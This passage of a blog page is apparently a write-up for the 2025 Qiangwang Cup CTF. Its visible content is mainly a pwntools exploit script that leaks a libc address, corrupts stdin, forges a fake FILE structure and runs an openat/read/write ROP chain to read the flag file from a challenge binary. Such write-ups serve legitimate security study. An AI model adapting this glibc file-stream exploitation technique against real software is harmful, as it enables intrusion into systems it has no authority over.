class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(log_level=&quot;debug&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)</span><br><span class="line">io = process(&quot;./pwn&quot;)</span><br><span class="line"># context.terminal = [&quot;tmux&quot;, &quot;split&quot;, &quot;-h&quot;]</span><br><span class="line">#io = remote(&quot;47.94.202.253&quot;,32781)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line">libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dbg(cmd=&quot;&quot;):</span><br><span class="line">    gdb.attach(io, cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(b&quot;Please input your token: &quot;)</span><br><span class="line">io.send(b&quot;a&quot; * 0x28)</span><br><span class="line">io.recvuntil(b&quot;a&quot; * 0x28)</span><br><span class="line">libc.address = u64(io.recv(6).ljust(8, b&quot;\x00&quot;)) - 0xADDAE</span><br><span class="line">log.success(&quot;libc: &quot; + hex(libc.address))</span><br><span class="line">stdin = libc.sym[&quot;_IO_2_1_stdin_&quot;]</span><br><span class="line">info(hex(stdin))</span><br><span class="line"></span><br><span class="line">io.recvuntil(b&quot;Choice: &quot;)</span><br><span class="line">io.sendline(b&quot;1&quot;)</span><br><span class="line">io.recvuntil(b&quot;Size: &quot;)</span><br><span class="line">io.sendline(str(stdin + 0x38 + 1))</span><br><span class="line">io.recvuntil(b&quot;Content: &quot;)</span><br><span class="line">io.send(b&quot;a&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(b&quot;Choice: &quot;)</span><br><span class="line">io.send(p64(libc.address + 0x203900) * 3 + p64(libc.address + 0x203918))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.send(</span><br><span class="line">    p64(libc.address + 0x2045C0) + p64(libc.address + 0x2045C0 + 0x300)</span><br><span class="line">)  # stdin buf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_file = flat(</span><br><span class="line">    &#123;</span><br><span class="line">        0x0: &quot; sh;&quot;,</span><br><span class="line">        0x10: p64(libc.sym[&quot;setcontext&quot;] + 61),</span><br><span class="line">        0x20: p64(libc.symbols[&quot;_IO_2_1_stdout_&quot;]),</span><br><span class="line">        0x78: p64(libc.address + 0x2046d0),</span><br><span class="line">        0x88: p64(libc.symbols[&quot;_environ&quot;] - 0x10),  # _lock</span><br><span class="line">        0xA0: p64(libc.symbols[&quot;_IO_2_1_stdout_&quot;]),</span><br><span class="line">        0xA8: p64(next(libc.search(asm(&quot;leave;ret;&quot;), executable=True))),</span><br><span class="line">        0xD8: p64(libc.symbols[&quot;_IO_wfile_jumps&quot;] + 0x10),</span><br><span class="line">        0xE0: p64(libc.symbols[&quot;_IO_2_1_stdout_&quot;] - 8),</span><br><span class="line">    &#125;,</span><br><span class="line">    filler=b&quot;\x00&quot;,</span><br><span class="line">)</span><br><span class="line">fake_file += (</span><br><span class="line">    p64(libc.address + 0x2045B8)</span><br><span class="line">    + p64(libc.address + 0x2045E0)</span><br><span class="line">    + p64(libc.address + 0x2038E0)</span><br><span class="line">)</span><br><span class="line">fake_file += p64(libc.address + 0x3FD000) + p64(libc.address + 0x3D2A40)</span><br><span class="line"></span><br><span class="line">pop_rax = next(libc.search(asm(&quot;pop rax;ret&quot;), executable=True))</span><br><span class="line">pop_rdi = next(libc.search(asm(&quot;pop rdi;ret&quot;), executable=True))</span><br><span class="line">pop_rsi = next(libc.search(asm(&quot;pop rsi;ret&quot;), executable=True))</span><br><span class="line">pop_rcx = libc.address + 0xA877E</span><br><span class="line">openat = libc.sym[&quot;openat&quot;]</span><br><span class="line">read = libc.sym[&quot;read&quot;]</span><br><span class="line">write = libc.sym[&quot;write&quot;]</span><br><span class="line">buf = libc.address + 0x2046d0</span><br><span class="line">payload = (</span><br><span class="line">    b&#x27;flag\x00\x00\x00\x00&#x27;</span><br><span class="line">    + p64(pop_rdi)</span><br><span class="line">    + p64(0xFFFFFFFFFFFFFF9C)</span><br><span class="line">    + p64(pop_rsi)</span><br><span class="line">    + p64(buf)</span><br><span class="line">    + p64(pop_rax)</span><br><span class="line">    + p64(0)</span><br><span class="line">    + p64(libc.address + 0x11EA8A)</span><br><span class="line">    + p64(openat)</span><br><span class="line">)</span><br><span class="line">payload += (</span><br><span class="line">    p64(pop_rdi)</span><br><span class="line">    + p64(3)</span><br><span class="line">    + p64(pop_rsi)</span><br><span class="line">    + p64(buf + 0x1000)</span><br><span class="line">    + p64(pop_rax)</span><br><span class="line">    + p64(0x30)</span><br><span class="line">    + p64(libc.address + 0x11EA8A)</span><br><span class="line">    + p64(read)</span><br><span class="line">)</span><br><span class="line">payload += (</span><br><span class="line">    p64(pop_rdi)</span><br><span class="line">    + p64(1)</span><br><span class="line">    + p64(pop_rsi)</span><br><span class="line">    + p64(buf + 0x1000)</span><br><span class="line">    + p64(pop_rax)</span><br><span class="line">    + p64(0x30)</span><br><span class="line">    + p64(libc.address + 0x11EA8A)</span><br><span class="line">    + p64(write)</span><br><span class="line">)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">dbg(&quot;b *0x7ffff7c8afdd\nc&quot;)</span><br><span class="line"></span><br><span class="line">io.send(fake_file+payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42907020/1760864460706-80e7d59b-8d51-4e15-9bf9-0dc5667d0431.png"
+                      alt="img"
+                ></p>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> 2025强网杯wp</li>
+        <li><strong>Author:</strong> yfor</li>
+        <li><strong>Created at
+                :</strong> 2025-10-29 22:49:14</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-10-28 20:43:32
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://yfor-yfor.github.io/2025/10/29/2025强网杯/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+
+		
+
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+                    lang: 'zh-CN',
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">2025强网杯wp</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#flag-market"><span class="nav-text">flag-market</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text"></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#-1"><span class="nav-text"></span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#bph"><span class="nav-text">bph</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">yfor</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        1 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
